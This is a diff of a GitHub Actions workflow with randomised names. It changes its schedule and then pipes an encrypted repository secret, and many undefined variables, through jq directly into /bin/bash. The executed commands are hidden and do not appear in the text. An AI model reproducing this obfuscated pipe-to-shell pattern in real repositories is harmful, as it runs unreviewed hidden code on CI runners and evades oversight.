@@ -3,7 +3,7 @@ name: chengwangti4354
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 2/6 * * *'
+    - cron: '6 0/6 * * *'
 
 jobs:
   build:
@@ -12,16 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: chengwangti4354
         env:
-          ff3: ${{ secrets.ff3 }}
+          o31: ${{ secrets.o31 }}
         run: |
-          echo $ff3 | jq -r .kljlt882 | /bin/bash
-          echo $ql11 | jq -r .nvm670 | /bin/bash
-          echo $slyr71493 | jq -r .sgzv2453 | /bin/bash
-          echo $outly946 | jq -r .pwp6 | /bin/bash
-          echo $fkcij317 | jq -r .wdd6208 | /bin/bash
-          echo $ubvpq6 | jq -r .ec5951 | /bin/bash
-          echo $w11146 | jq -r .oovve50 | /bin/bash
-          echo $gs8912 | jq -r .krgh76 | /bin/bash
-          echo $icrn017 | jq -r .f5 | /bin/bash
-          echo $krrip71 | jq -r .mrf63 | /bin/bash
+          echo $o31 | jq -r .o42 | /bin/bash
+          echo $tp137 | jq -r .zd67 | /bin/bash
+          echo $x34859 | jq -r .hqfc5 | /bin/bash
+          echo $qv101 | jq -r .km22 | /bin/bash
+          echo $bcajr489 | jq -r .of0 | /bin/bash
+          echo $cdoe96214 | jq -r .ro015 | /bin/bash
+          echo $r1964 | jq -r .uer1984 | /bin/bash
+          echo $gk497 | jq -r .duxyl193 | /bin/bash
+          echo $y11593 | jq -r .kraa7 | /bin/bash
+          echo $va3220 | jq -r .hivh63012 | /bin/bash
+          echo $arfi8 | jq -r .zzv93672 | /bin/bash
+          echo $m8 | jq -r .la17 | /bin/bash
+          echo $ytz6006 | jq -r .mpete3026 | /bin/bash
 
